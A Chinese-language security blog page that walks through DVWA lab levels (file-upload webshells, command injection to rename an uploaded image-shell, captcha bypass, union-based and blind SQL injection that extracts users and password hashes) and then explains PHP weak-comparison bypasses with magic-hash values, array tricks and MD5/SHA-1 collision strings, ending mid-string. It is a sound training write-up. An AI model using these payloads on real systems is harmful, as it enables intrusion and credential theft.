<h2 id="5-File-upload文件上传"><a href="#5-File-upload文件上传" class="headerlink" title="5.File upload文件上传"></a>5.File upload文件上传</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/.com//c92f0ca2659de359b6dda9fdd58d23cd-20250425172053-9ya348y.png" alt="c92f0ca2659de359b6dda9fdd58d23cd"></p>
<p>可以看到，没有任何限制，所以直接上传一个php后门文件即可</p>
<p> 直接上传一句话木马，蚁剑链接即可</p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p> 可以看到，靶场对文件类型做了限制，只允许上传png、jpeg，并且检查</p>
<p><img src="/.com//fd8bc231d15557db234ddd92e2d4a745-20250425172423-br5ll4y.png" alt="fd8bc231d15557db234ddd92e2d4a745"></p>
<p>burp后台改后缀即可</p>
<p>‍</p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p> 看源代码可以发现，不仅限制了文件类型，而且限制了大小，不能少于100kb</p>
<p><img src="/.com//42a6ceb6367ab31ef8b9468d9d5c45fb-20250425172446-hhvsnf6.png" alt="42a6ceb6367ab31ef8b9468d9d5c45fb"></p>
<p>可以上传一个图片马，打开cmd，输入以下命令：<code>copy post2.php/a + 111.png/b 66.png</code>​</p>
<p><img src="/.com//549490ef5de7cd680ca26bd8f524f483-20250425172455-32a0xdu.png" alt="549490ef5de7cd680ca26bd8f524f483"></p>
<p>此时已经上传成功，但不能利用</p>
<p><img src="/.com//4a84d8fcccf0c77b894d775b47aa45cd-20250425172506-52ttghn.png" alt="4a84d8fcccf0c77b894d775b47aa45cd"></p>
<p>在命令注入中输入127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php</p>
<p><img src="/.com//ccfc7557d167997fdc4dd98f505a1078-20250425172532-dnkw477.png" alt="ccfc7557d167997fdc4dd98f505a1078">此时发现，888.png已经被改名为888.php</p>
<p>‍</p>
<h2 id="6-insecure-captcha不安全的验证"><a href="#6-insecure-captcha不安全的验证" class="headerlink" title="6.insecure captcha不安全的验证"></a>6.insecure captcha不安全的验证</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><p> 本关是在第二步做验证，所以把step改为2就可以绕过验证</p>
<p><img src="/.com//eabf443fe5d55d6af0739e5c7df2e765-20250425172652-x0th1hw.png" alt="eabf443fe5d55d6af0739e5c7df2e765"></p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p> 依旧抓包改包</p>
<p><img src="/.com//3635ebcbdcf767c961b46cda65863f80-20250425172657-5hierei.png" alt="3635ebcbdcf767c961b46cda65863f80"></p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p><img src="/.com//490a93c21a9bd427fe3d29dea67d7efa-20250425172703-77m3kop.png" alt="490a93c21a9bd427fe3d29dea67d7efa"></p>
<p>让通过验证的情况增加了一种。原先是只有验证码为真才能通过验证，现在新增“或者g-recaptcha-response且HTTP_USER_AGENT为特定内容”通过验证。</p>
<p> 那直接用Burpsuite修改数据包</p>
<p><img src="/.com//8601e5ee714e65e6521aaecea77fbe2d-20250425172708-5gq4swo.png" alt="8601e5ee714e65e6521aaecea77fbe2d"></p>
<p>‍</p>
<h2 id="7-SQL-injection-sql注入"><a href="#7-SQL-injection-sql注入" class="headerlink" title="7.SQL injection sql注入"></a>7.SQL injection sql注入</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><ol>
<li>输入1+2，可以看到，并未输出3，所以可以判定是字符型注入</li>
</ol>
<p><img src="/.com//91a5a615ee0f8c4b9199dd8788cb79e2-20250425172821-gb4jvax.png" alt="91a5a615ee0f8c4b9199dd8788cb79e2"></p>
<p>输入如下payload：’1 or 1=1’ ，可以看到有报错，所以一定存在sql注入</p>
<p><img src="/.com//0ded62d0731c2502d756236e702834a6-20250425172828-2scjktq.png" alt="0ded62d0731c2502d756236e702834a6"></p>
<p><img src="/.com//4fd521db8e735523d0a818882dce5597-20250425172831-e9o5jfm.png" alt="4fd521db8e735523d0a818882dce5597"></p>
<p>使用order by判断字段数 1’ order by 2 #</p>
<p><img src="/.com//a17effc3868eb93c474867f504fe2e02-20250425172838-0nbohx7.png" alt="a17effc3868eb93c474867f504fe2e02"></p>
<p>1’ order by 3 #</p>
<p><img src="/.com//3200280212d7dbbf9417cd5f46a177ce-20250425172844-yv8r8qc.png" alt="3200280212d7dbbf9417cd5f46a177ce"></p>
<p>由此判断，他只有两个字段</p>
<ol>
<li>然后使用联合查询 1’ union select 1,2 # 获取回显位置</li>
</ol>
<p><img src="/.com//14b5a5a1f63d114e0c22f9649147a3fd-20250425172850-1pa3jj7.png" alt="14b5a5a1f63d114e0c22f9649147a3fd"></p>
<p>在对应位置获取数据库名 1’ union select database(),2 #</p>
<p><img src="/.com//5c64dd66f4fed0355fd501f7ce4768e7-20250425172856-izm3bma.png" alt="5c64dd66f4fed0355fd501f7ce4768e7"></p>
<p>获取数据库所有表名 1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</p>
<p><img src="/.com//60b5183c063b38ef89a35c0f06b11302-20250425172901-19j6jn0.png" alt="60b5183c063b38ef89a35c0f06b11302"></p>
<pre><code>获取users字段名
</code></pre>
<p>1’ union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() #</p>
<p><img src="/.com//9b28bb76146997ac3c1a0310c70c0290-20250425172911-y5kdd7j.png" alt="9b28bb76146997ac3c1a0310c70c0290"></p>
<ol>
<li>获取字段值</li>
</ol>
<p> 1’ union select password,user from users #</p>
<p><img src="/.com//830ea6ebdea4a1cafbd68c3b1fc28c7d-20250425172925-6nzb1g3.png" alt="830ea6ebdea4a1cafbd68c3b1fc28c7d"></p>
<p>现在已经拿到了用户和密码，但密码是加密的，可使用md5自行解密 <a target="_blank" rel="noopener" href="https://cmd5.com/" title="md5在线解密破解,md5解密加密">md5在线解密破解,md5解密加密</a></p>
<p>‍</p>
<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><ol>
<li>先选中1，抓一个包，然后发到重放模块，用于测试，可以修改参数，数字型注入</li>
</ol>
<p> id修改为1+1，出现报错</p>
<p><img src="/.com//f290b11a4a46c412831d62057faa65c5-20250425173006-w7azyem.png" alt="f290b11a4a46c412831d62057faa65c5"></p>
<p>使用order by判断字段数</p>
<p><img src="/.com//f7080fe5b14c527ac83e957fa6f387af-20250425173025-p1mqx8c.png" alt="f7080fe5b14c527ac83e957fa6f387af"></p>
<p><img src="/.com//7e576d86d507cb5fda0d514b7f339a7c-20250425173028-dvfygd6.png" alt="7e576d86d507cb5fda0d514b7f339a7c"></p>
<p>输入联合查询语句</p>
<p><img src="/.com//94c752d33768607b940ba5c088b8454c-20250425173035-pg461k1.png" alt="94c752d33768607b940ba5c088b8454c"></p>
<p>剩余步骤同上</p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><p> 1.输入1’，发现报错</p>
<p><img src="/.com//c3e7ddd980a483947e4df2376ac0d2ff-20250425173042-zcr3d58.png" alt="c3e7ddd980a483947e4df2376ac0d2ff"></p>
<p>输入联合查询语句</p>
<p><img src="/.com//1bfc929320387d76beafeb6597f52f71-20250425173052-250wxuk.png" alt="1bfc929320387d76beafeb6597f52f71"></p>
<p>按上述步骤进行查询</p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p> 限制只能为数字   不存在注入</p>
<p>‍</p>
<h2 id="8-SQL-injection（blind）盲注"><a href="#8-SQL-injection（blind）盲注" class="headerlink" title="8.SQL injection（blind）盲注"></a>8.SQL injection（blind）盲注</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><ol>
<li>输入 1’ and 1=1 # 可以看到 正常执行</li>
</ol>
<p><img src="/.com//34337217f9b95502cde5e73d522aba79-20250425173105-dwfpfwp.png" alt="34337217f9b95502cde5e73d522aba79"></p>
<p>猜解开数据库长度1’ and length(database())=x #</p>
<p><img src="/.com//751149ca4a1557d6985de8d258d2cf01-20250425173119-c3wcxww.png" alt="751149ca4a1557d6985de8d258d2cf01"></p>
<p><img src="/.com//4b90b927976bd2e18252b41bdb1b5f48-20250425173123-ffmyd3b.png" alt="4b90b927976bd2e18252b41bdb1b5f48"></p>
<p>用aascii猜解数据库名 1’ and ascii(substr(database(),1,1))=100 # 由此确定，第一位ascii是100，对比ascii表（<a target="_blank" rel="noopener" href="http://ascii.wjccx.com/" title="ASCII码对照表-完整ASCII码表-我就查查询">ASCII码对照表-完整ASCII码表-我就查查询</a>）可得 为d</p>
<p><img src="/.com//43b0bc8b8ca471ba0126fe4f5f6a2a0e-20250425173156-3qawi2b.png" alt="43b0bc8b8ca471ba0126fe4f5f6a2a0e"></p>
<ol>
<li>和普通sql注入相同，依次查询库名表名字段名</li>
</ol>
<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><ol>
<li>随意选择一个数，然后抓包</li>
</ol>
<p><img src="/.com//7ac45f64d1403222c82393a5b210906c-20250425173331-kchwbjb.png" alt="7ac45f64d1403222c82393a5b210906c"></p>
<p>修改参数 1 and length(database())=4 #，根据布尔 盲注判断，，数据库名为4</p>
<p><img src="/.com//a4553a678f1d6482e5fb8ce9841c3538-20250425173338-wyz18se.png" alt="a4553a678f1d6482e5fb8ce9841c3538"></p>
<p>下面依旧使用sql语句进行查询，步骤同上</p>
<p>‍</p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><ol>
<li>1’ and 1=1 # 测试，发现成功执行</li>
</ol>
<p><img src="/.com//ca86f4d80df4b3feccbf28e4ccdaf857-20250425173346-utigrlz.png" alt="ca86f4d80df4b3feccbf28e4ccdaf857"></p>
<p>盲注，测试数据库名长度 1’ and length(database())=4 #</p>
<p><img src="/.com//31274efc2f2bde6b41b806798e997547-20250425173353-ae59gvt.png" alt="31274efc2f2bde6b41b806798e997547"></p>
<p>接下来的步骤同上</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmawcfx8p0000cg7k4nvo6cf8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/PHP比较漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP比较漏洞"><a href="#PHP比较漏洞" class="headerlink" title="PHP比较漏洞"></a>PHP比较漏洞</h1><h1 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.comparison.php">php</a>中有两种比较的符号 <code>==</code>​ 与 <code>===</code>​</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$a</span> == <span class="variable">$b</span>;  <span class="comment">// ==  在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br><span class="line">	<span class="variable">$a</span> === <span class="variable">$b</span>; <span class="comment">// === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;PHP 8.0.0 之前，如果 string 与数字或者以数字开头的字符串进行比较， 则在&#x3D;&#x3D;​**&#x3D;&#x3D;比较前会将 string 转化为数字&#x3D;&#x3D;**​&#x3D;&#x3D;。&#x3D;&#x3D;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174634-5opnoh2.png" alt="image"></p>
<p><img src="/.com//image-20250417174637-541lm5p.png" alt="image"></p>
<p>实验结果：</p>
<ol>
<li>​<code>&quot;admin&quot;==0</code>​ 比较的时候，会将字符串<code>admin</code>​强制转化成整数<code>0</code>​</li>
<li>​<code>&quot;1admin&quot;==1</code>​ 比较的时候，会将字符串<code>1admin</code>​强制转化成整数<code>1</code>​</li>
<li>字符串<code>admin1</code>​强制转化成整数<code>0</code>​</li>
<li>​<code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>​比较的时候，PHP会将开头为<code>0e</code>​这类字符串识别为科学计数法的数字，<code>0e123456</code>​相当于<code>&lt;span class=&quot;ne-text&quot;&gt;0*10&lt;/span&gt;&lt;sup&gt;123456&lt;/sup&gt;&lt;span class=&quot;ne-text&quot;&gt; = 0&lt;/span&gt;</code>​，同理，<code>0e456789=0</code>​，所以两者相等。</li>
</ol>
<blockquote>
<p>注意：例子中的字符串还有一个特征，<code>0e</code>​后面字符全是数字，才能漏洞利用，否则例如<code>0e3f2c44</code>​仍然会被识别成字符串。</p>
</blockquote>
<h1 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h1><p><img src="/.com//image-20250417174658-89jjpnd.png" alt="image"></p>
<p><img src="/.com//image-20250417174701-vej9ys6.png" alt="image"></p>
<p>&#x3D;&#x3D;当字符串被强制转化为数值，其结果和类型如下:&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;如果该字符串没有包含&#x3D;&#x3D;​&#x3D;&#x3D;​<code>&#39;.&#39;, e, E</code>​&#x3D;&#x3D;​&#x3D;&#x3D;并且其数值在整形范围之内，该字符串作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>int</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值，其他所有情况下都被作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>float</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值；&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。&#x3D;&#x3D;</p>
<p>也印证了实验1中通过<code>&quot;admin1&quot;==1 =&gt;False</code>​</p>
<h1 id="0e绕过弱比较-MD5和SHA1函数漏洞"><a href="#0e绕过弱比较-MD5和SHA1函数漏洞" class="headerlink" title="0e绕过弱比较-MD5和SHA1函数漏洞"></a>0e绕过弱比较-MD5和SHA1函数漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp;<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">sha1</span>(<span class="variable">$s1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$s2</span>) &amp;&amp; <span class="variable">$s1</span>!=<span class="variable">$s2</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>sha1</code>​和<code>md5</code>​属于哈希编码，在<code>PHP</code>​中，这两种编码是存在绕过漏洞的。</p>
<p>PHP在处理哈希字符串时，利用<code>!=</code>​或<code>==</code>​来对哈希值进行比较，把以<code>0e</code>​开头的哈希值都解释为<code>0</code>​，所以如果两个不同的密码经过哈希加密后，其哈希值都是以<code>0e</code>​开头的，那么<code>0e</code>​将会认为他们相同，都是<code>0</code>​。只需要传入开头都是<code>0e</code>​的两个值，比如<code>$s1=QNKCDZO</code>​,<code> $s2=240610708</code>​, 便可成功绕过。</p>
<p>利用<code>0e</code>​绕过方式只有在弱比较的时候才能使用。</p>
<h1 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h1><p><img src="/.com//image-20250417174743-u6bmulp.png" alt="image"></p>
<p><img src="/.com//image-20250417174746-61l5osn.png" alt="image"></p>
<p>以下值在<code>md5</code>​加密后以<code>0e</code>​开头：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>

<p>验证</p>
<p><img src="/.com//image-20250417174803-33e2qv1.png" alt="image"></p>
<p>批量验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;QNKCDZO&#x27;</span>, <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s878926199a&#x27;</span>, <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s214587387a&#x27;</span>, <span class="string">&#x27;s214587387a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174815-hvdrbp5.png" alt="image"></p>
<p>以下值在<code>sha1</code>​加密后以<code>0e</code>​开头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;aaroZmOk&#x27;</span>, <span class="string">&#x27;aaK1STfY&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaO8zKZF&#x27;</span>, <span class="string">&#x27;aa3OFF9m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0e1290633704&#x27;</span>, <span class="string">&#x27;10932435112&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">sha1</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174829-y4ysat8.png" alt="image"></p>
<p>双重<code>MD5</code>​加密后<code>0e</code>​开头：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;7r4lGXCH2Ksu2JNT3BYM&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CbDLytmyGm2xQyaLNhWn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;770hQgrBOjrcqftrlaZk&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(cipher.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174839-vxse526.png" alt="image"></p>
<blockquote>
<p>其它情况：会限制字符串为纯数字或字母</p>
</blockquote>
<p>‍</p>
<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>对于php强比较和弱比较：<code>md5()</code>​，<code>sha1()</code>​函数无法处理数组，如果传入的为数组，会返回<code>NULL</code>​，所以两个数组经过加密后得到的都是<code>NULL</code>​，也就是相等的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>payload: ?a[]=1&amp;b[]=2	</code>​</p>
<p>‍</p>
<h1 id="实验4"><a href="#实验4" class="headerlink" title="实验4"></a>实验4</h1><p><img src="/.com//image-20250417174912-0qsam45.png" alt="image"></p>
<p><img src="/.com//image-20250417174914-tik3goc.png" alt="image"></p>
<p>‍</p>
<h1 id="实验5"><a href="#实验5" class="headerlink" title="实验5"></a>实验5</h1><p>查看报错信息去验证上述结论</p>
<p><img src="/.com//image-20250417174924-ovxj2mz.png" alt="image"></p>
<p><img src="/.com//image-20250417174927-4udg3hc.png" alt="image"></p>
<p>​<code>md5()</code>​函数希望接受的是字符串而不是数组。</p>
<p>‍</p>
<h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; </span><br><span class="line">   <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>比较<code>a</code>​，<code>b</code>​时会将<code>a</code>​，<code>b</code>​转换为字符串比较，就不能用数组绕过了。因为数组转换为字符串时都会变成<code>&quot;Array&quot;</code>​。</p>
<p>‍</p>
<h1 id="实验6"><a href="#实验6" class="headerlink" title="实验6"></a>实验6</h1><p><img src="/.com//image-20250417174950-8fwszbt.png" alt="image"></p>
<p><img src="/.com//image-20250417174953-l3vi7qb.png" alt="image"></p>
<p>因为数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="实验7"><a href="#实验7" class="headerlink" title="实验7"></a>实验7</h1><p><img src="/.com//image-20250417175005-bwx4402.png" alt="image"></p>
<p><img src="/.com//image-20250417175008-g6uw5ex.png" alt="image"></p>
<p>‍</p>
<p>文件：</p>
<p>linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o <span class="number">1</span>.bin <span class="number">2</span>.bin</span><br></pre></td></tr></table></figure>

<p>windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p <span class="number">123</span>.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="sha1碰撞："><a href="#sha1碰撞：" class="headerlink" title="sha1碰撞："></a>sha1碰撞：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span 